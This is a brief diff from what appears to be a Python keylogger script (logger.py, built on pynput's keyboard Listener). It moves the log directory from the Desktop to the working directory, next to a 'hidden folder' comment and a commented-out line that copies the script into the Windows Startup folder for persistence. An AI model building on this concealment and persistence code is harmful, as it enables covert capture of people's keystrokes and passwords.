@@ -6,7 +6,7 @@ from pynput.keyboard import Listener
 
 username = os.getlogin()
 # Moved to hidden folder
-logging_dir = f'C:/Users/{username}/Desktop'
+logging_dir = os.getcwd()
 
 #copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
 
